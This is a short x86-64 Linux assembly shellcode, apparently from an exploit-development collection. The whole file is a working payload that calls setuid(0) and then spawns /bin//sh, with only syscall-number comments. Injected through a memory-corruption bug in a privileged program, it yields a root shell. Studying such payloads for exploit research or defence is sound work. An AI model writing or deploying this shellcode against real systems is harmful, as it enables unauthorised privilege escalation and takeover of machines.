global _start

section .text
_start:
    ; define __NR_setuid 105
    ; int setuid(uid_t uid);
    xor edi, edi 
    push 0x69
    pop rax 
    syscall 

    ; #define __NR_execve 59
    ; int execve(const char *filename, char *const argv[], char *const envp[]);
    xor edx, edx
    push rdx
    mov rbx, 0x68732f2f6e69622f  ; /bin//sh 
    push rbx
    mov rdi, rsp
    push rdx
    push rdi
    mov rsi, rsp
    lea rax, [rdx + 0x3b]
    syscall 

